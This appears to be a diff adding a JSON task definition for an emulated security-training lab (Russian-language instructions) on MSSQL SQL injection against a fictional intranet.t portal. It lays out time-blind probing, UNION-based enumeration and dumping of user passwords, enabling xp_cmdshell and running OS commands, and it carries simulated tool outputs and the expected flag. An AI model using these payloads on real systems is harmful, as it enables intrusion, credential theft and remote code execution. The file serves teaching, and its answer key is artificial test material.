@@ -1,0 +1,29 @@
+{
+  "id": "web-sqli-dbms-enterprise",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{mssql_xp_cmdshell_sys4dm1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: MSSQL — от инъекции к RCE через xp_cmdshell\n\n`https://intranet.t/report?id=1` — корпоративный портал на Microsoft SQL Server.\nЗадержка по `WAITFOR DELAY` выдаёт диалект. Проверь права, включи xp_cmdshell\nи прочитай флаг с диска сервера.\n\n1. Time-blind: сколько занял запрос?\n\n   curl -s -o /dev/null -w '%{time_total}\\n' \"https://intranet.t/report?id=1; WAITFOR DELAY '0:0:5'-- -\"\n\n2. Версия и роль сервера:\n\n   curl -s \"https://intranet.t/report?id=1 UNION SELECT @@version,2-- -\"\n   curl -s \"https://intranet.t/report?id=1 UNION SELECT SYSTEM_USER,IS_SRVROLEMEMBER('sysadmin')-- -\"\n\n3. Метаданные и дамп:\n\n   curl -s \"https://intranet.t/report?id=1 UNION SELECT name,2 FROM sys.databases-- -\"\n   curl -s \"https://intranet.t/report?id=1 UNION SELECT STRING_AGG(table_name,','),2 FROM information_schema.tables-- -\"\n   curl -s \"https://intranet.t/report?id=1 UNION SELECT STRING_AGG(user,':')+':'+STRING_AGG(password,':'),2 FROM users-- -\"\n\n4. Включаем xp_cmdshell и исполняем команду ОС:\n\n   curl -s \"https://intranet.t/report?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -\"\n   curl -s \"https://intranet.t/report?id=1; EXEC xp_cmdshell 'whoami'-- -\"\n\n5. Читаем флаг и пишем в found.txt:\n\n   curl -s \"https://intranet.t/report?id=1; EXEC xp_cmdshell 'type C:\\\\flag.txt'-- -\" > found.txt\n\n6. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция intranet.t)",
+      "cases": [
+        { "match": "WAITFOR DELAY|WAITFOR%20DELAY", "example": "-s -o /dev/null -w '%{time_total}\\n' \"...; WAITFOR DELAY '0:0:5'-- -\"", "output": "5.02\n" },
+        { "match": "@@version", "example": "-s '... UNION SELECT @@version,2-- -'", "output": "... Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...\n" },
+        { "match": "IS_SRVROLEMEMBER", "example": "-s '... UNION SELECT SYSTEM_USER,IS_SRVROLEMEMBER('sysadmin')-- -'", "output": "... sa | 1 ...\n" },
+        { "match": "sys\\.databases", "example": "-s '... UNION SELECT name,2 FROM sys.databases-- -'", "output": "... master, model, msdb, app ...\n" },
+        { "match": "information_schema\\.tables", "example": "-s '... UNION SELECT STRING_AGG(table_name,','),2 FROM information_schema.tables-- -'", "output": "... users,orders,audit ...\n" },
+        { "match": "information_schema\\.columns", "example": "-s '... UNION SELECT STRING_AGG(column_name,','),2 FROM information_schema.columns ...'", "output": "... id,user,password,role ...\n" },
+        { "match": "FROM users", "example": "-s '... UNION SELECT STRING_AGG(user,':')+':'+STRING_AGG(password,':'),2 FROM users-- -'", "output": "... admin:5f4dcc3b5aa765d61d8327deb882cf99:alice:... ...\n" },
+        { "match": "whoami", "example": "-s '... EXEC xp_cmdshell 'whoami'-- -'", "output": "... nt authority\\system ...\n" },
+        { "match": "flag", "example": "-s '... EXEC xp_cmdshell 'type C:\\flag.txt'-- -'", "output": "... nto{mssql_xp_cmdshell_sys4dm1n} ...\n" },
+        { "match": "xp_cmdshell", "example": "-s '... EXEC xp_cmdshell 'dir C:\\'-- -'", "output": "Commands completed successfully.\n" },
+        { "match": "sp_configure|RECONFIGURE", "example": "-s '... EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -'", "output": "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /report на intranet.t.\n"
+    }
+  }
+}
